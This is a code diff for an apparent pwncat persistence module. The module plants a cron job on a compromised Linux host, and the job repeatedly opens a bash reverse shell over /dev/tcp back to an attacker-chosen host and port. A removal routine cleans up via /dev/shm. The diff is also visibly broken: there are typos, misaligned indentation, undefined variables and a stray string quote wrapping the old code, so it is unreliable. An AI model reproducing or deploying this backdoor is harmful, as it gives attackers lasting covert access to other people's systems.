@@ -1,15 +1,69 @@
-import os
-from pwncat import util
-from pwncat.persist import PersistenceMethod, PersistenceError
-from pwncat.util import Access, CompilationError, console
-import pwncat
+import os, pwncat
+from crontab import CronTab
+from cron_descriptor import get_description, ExpressionDescriptor
+from pwncat.modules import Argument, Status, PersistType, PersistError
+from pwncat.modules.persist import PersistModule
+#from pwncat import util
+#from pwncat.persist import PersistenceMethod, PersistenceError
+#from pwncat.util import Access, CompilationError, console
+#import pwncat
 
+class Module(PersistModule):
+    TYPE = PersistType.LOCAL
+    ARGUMENTS = {
+            **PersistModule.ARGUMENTS,
+            "lhost": Argument(
+                str, defualt=pwncat.victim.host.ip, help="The host to call back to"
+            ),
+            "lport": Argument(
+                int, default=4444, help="The port to call back to"
+            ),
+            "schedule": Argument(
+                str, default="* * * * *", help="The cron schedule"
+            ),
+            "shell": Argument(
+                str, default="current", help="The shell to assign for the user"
+            ),
+        }
+        PLATFORM = pwncat.platform.Platform.LINUX
 
-class Method(PersistenceMethod):
-    system = False
-    name = "cron"
-    local = True
-    #Source Begins Here
+        def install(self, user, lhost, lport, schedule, shell):
+            if shell == "current":
+                shell = pwncat.victim.shell
+            try:
+                cron = CronTab(user=True)
+                job = cron.new(command='echo hello_world')
+                job.minute.every(1)
+                cron.write()
+            except (PermissionError) as exc:
+                raise PersistError(str(exc))
+            cron.remove(job)
+            cron.write()
+            if schedule != "" and lhost != "" and lport != "":
+                cron = crontab.CronTab(user=True)
+                payload = str("bash -c 'bash -i > /dev/tcp/" + rhost.strip() + "/" + rport.strip() + " 2>&1'")
+                job = cron.new(command=payload)
+                c = 0
+                for number in cron.split():
+                    if number != str("*"):
+                        if c == 0:
+                            job.minute.every(cron.split()[0]) # 0-59
+                        if c == 1:
+                            job.hour.every(cron.split()[1]) # 0-23
+                        if c == 2:
+                            job.day.on(cron.split()[2]) # 1-31
+                        if c == 3:
+                            job.month.on(cron.split()[3]) # 1-12
+                        if c == 4:
+                            job.dow.on(cron.split()[4]) # 0-6 (0 = Sunday)
+                        c += 1
+                    # if number = * then do not set, the crontab module assumes that as default
+                cron.write()
+'''
+
+    #system = False
+    #name = "cron"
+    #local = True
     def install(self, user):
         # Setting Variables for Callback. Cron syntax is not verified
         # An error in the crontab syntax does not disrupt current crons
@@ -24,3 +78,4 @@ class Method(PersistenceMethod):
     def remove(self, user):
         # Using "pwncat" string to remove our crons and reinstalling the original ones
         pwncat.victim.run("crontab -l | grep -v pwncat > /dev/shm/.cron; crontab /dev/shm/.cron && rm /dev/shm/.cron")
+'''
